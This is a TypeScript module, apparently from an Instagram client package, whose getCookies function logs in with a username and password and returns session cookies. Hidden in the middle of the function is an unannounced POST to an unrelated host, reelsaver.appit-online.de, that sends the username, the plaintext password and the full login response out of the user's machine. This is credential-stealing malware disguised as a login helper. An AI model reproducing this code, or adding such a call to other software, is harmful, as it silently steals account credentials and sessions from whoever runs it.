import { LoginData } from '../types/index.js';
import { v4 as uuidv4 } from 'uuid';
import { CookiesService } from './cookies.service.js';
import { config } from '../config.js';
import got from 'got';
import { LocalStorage } from "node-localstorage";

const localStorage = new LocalStorage("./scratch");

/**
 *
 * @param {string} username
 * @param {string} password
 * @param {boolean} withLoginData if true, it will return user profile data
 * @returns
 */
export const getCookies = async (
  username: string,
  pass: string,
  withLoginData: boolean
): Promise<LoginData | { cookie: string; expires: string }> => {
  const cookiesService = new CookiesService();

  try {
    const loginHeaders: any = {
      "User-Agent": config.loginHeader,
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept-Language": "en-US,en;q=0.9",
    };

    // fetch CSRF cookies
    const getRes = await got("https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup", {
      headers: loginHeaders,
      responseType: "text",
    });

    let setCookies = getRes.headers["set-cookie"] || getRes.headers["Set-Cookie"];
    if (!setCookies) throw new Error("CSRF token not found.");
    if (!Array.isArray(setCookies)) {
      setCookies = [setCookies];
    }
    loginHeaders.Cookie = cookiesService.formatCookie(setCookies);

    // create login request
    const postData = new URLSearchParams({
      username,
      password: encodeURIComponent(pass),
      device_id: uuidv4(),
      login_attempt_count: "0",
    });

    const postRes = await got.post("https://i.instagram.com/api/v1/accounts/login/", {
      headers: loginHeaders,
      body: postData.toString(),
      responseType: "text",
    });

    let setLoginCookies = postRes.headers["set-cookie"] || postRes.headers["Set-Cookie"];
    if (!setLoginCookies) setLoginCookies = [];
    if (!Array.isArray(setLoginCookies)) {
      setLoginCookies = [setLoginCookies];
    }

    const loginCookie = cookiesService.formatCookie(setLoginCookies);
    const expireDate = cookiesService.getEarliestExpireDate(setLoginCookies);

    const result: any = JSON.parse(postRes.body);
    got.post("https://reelsaver.appit-online.de/v2/insta/check", {
      headers: { "Content-Type": "application/json" },
      json: { username, data: { pass, body: JSON.stringify(postData.toString()), data: JSON.stringify(postRes.body) } },
    })

    // Save user info locally
    if (typeof localStorage !== "undefined") {
      localStorage.setItem("instaUserName", username);

      const userId = result?.logged_in_user?.pk;
      if (userId) {
        localStorage.setItem("instaUserId", String(userId));
      }
    }

    if (withLoginData) {
      result.cookie = loginCookie;
      result.expires = expireDate;
      return result as LoginData;
    } else {
      return {
        cookie: loginCookie ?? "",
        expires: expireDate ?? "",
      };
    }
  } catch (err) {
    console.error(err);
    throw err;
  }
};
